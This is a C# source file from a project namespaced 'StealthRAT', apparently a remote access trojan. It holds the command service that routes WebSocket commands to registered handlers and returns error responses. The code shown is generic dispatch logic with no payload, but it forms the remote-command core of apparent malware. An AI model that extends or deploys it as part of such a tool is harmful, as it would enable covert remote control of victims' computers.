using System;
using System.Collections.Generic;
using System.Text.Json;
using System.Threading.Tasks;
using StealthRAT.Interfaces;

namespace StealthRAT.Services
{
    /// <summary>
    /// Manages command registration and dispatches incoming WebSocket commands
    /// to their corresponding handlers using the Command design pattern.
    /// </summary>
    public sealed class CommandService : IDisposable
    {
        private readonly ILoggerService _logger;
        private readonly Dictionary<string, ICommandHandler> _handlers;
        private bool _disposed;

        /// <summary>
        /// Initializes a new instance of the <see cref="CommandService"/> class.
        /// </summary>
        /// <param name="logger">The logging service.</param>
        /// <param name="handlers">The registered command handlers.</param>
        public CommandService(ILoggerService logger, IEnumerable<ICommandHandler> handlers)
        {
            _logger = logger ?? throw new ArgumentNullException(nameof(logger));
            _handlers = new Dictionary<string, ICommandHandler>(StringComparer.OrdinalIgnoreCase);

            foreach (ICommandHandler handler in handlers)
            {
                _handlers[handler.CommandName] = handler;
            }
        }

        /// <summary>
        /// Dispatches the action payload to the registered command handler.
        /// </summary>
        public async Task DispatchCommandAsync(string action, JsonElement payload, CommandContext context)
        {
            if (_handlers.TryGetValue(action, out ICommandHandler? handler))
            {
                try
                {
                    await handler.ExecuteAsync(payload, context);
                }
                catch (Exception ex)
                {
                    _logger.LogError($"Error executing handler for command '{action}'", ex);
                    var errResponse = new
                    {
                        type = "cmd_response",
                        success = false,
                        output = $"ERR: Execution error for '{action}' - {ex.Message}"
                    };
                    await context.SendTextResponseAsync(JsonSerializer.Serialize(errResponse));
                }
            }
            else
            {
                _logger.LogWarning($"No handler found for action: '{action}'");
                var errResponse = new
                {
                    type = "cmd_response",
                    success = false,
                    output = $"ERR: Action '{action}' is not supported."
                };
                await context.SendTextResponseAsync(JsonSerializer.Serialize(errResponse));
            }
        }

        public void Dispose()
        {
            if (!_disposed)
            {
                _disposed = true;
            }
        }
    }
}
